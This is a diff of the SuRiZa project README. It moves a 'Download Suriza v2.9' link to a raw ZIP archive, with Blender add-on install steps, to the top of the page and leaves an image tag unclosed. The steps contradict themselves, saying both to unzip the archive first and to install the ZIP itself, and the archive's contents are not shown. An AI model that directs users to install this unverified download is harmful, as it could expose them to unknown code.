@@ -1,4 +1,10 @@
+<img width="1500" height="500" alt="xメインページ" src="https://github.com/user-attachments/assets/895a05a1-2366-458f-948c-7dc7ce0d5fbc" />
+👉[Download Suriza v2.9](https://github.com/arts2019/SuRiza/raw/main/suriza_v29.zip)
 
+
+**[IMPORTANT] Please unzip this folder first!**
+ 
+*Note: After downloading, open Blender 3.3+, go to Preferences -> Add-ons -> Install, and select this ZIP file to instantly activate the official baseline system.*
 
 
 
@@ -45,25 +51,8 @@ Formerly developed under the name SuRiZa, this project has now entered a new dev
 
 
 
-<img width="1600" height="900" alt="GitHub READMEのメイン画像：1600 × 900 px" src="https://github.com/user-attachments/assets/f74119b7-c613-4afe-b81a-6c2439a2ff38" />
-
-
-
-
-
-
-
-
- <img width="1500" height="500" alt="xメインページ" src="https://github.com/user-attachments/assets/895a05a1-2366-458f-948c-7dc7ce0d5fbc" />
-
-
-
-👉[Download Suriza v2.9](https://github.com/arts2019/SuRiza/raw/main/suriza_v29.zip)
-
-
-**[IMPORTANT] Please unzip this folder first!**
+<img width="1600" height="900" alt="GitHub READMEのメイン画像：1600 × 900 px" src="https://github.com/user-attachments/assets/f74119b7-c613-4afe-b81a-6c2439a2ff38
  
-*Note: After downloading, open Blender 3.3+, go to Preferences -> Add-ons -> Install, and select this ZIP file to instantly activate the official baseline system.*
 
 
 # **Initial Validation of Coordinate Point Extraction Using SuRiZa Grid-Type Blades and the Shift Toward Stabilization**
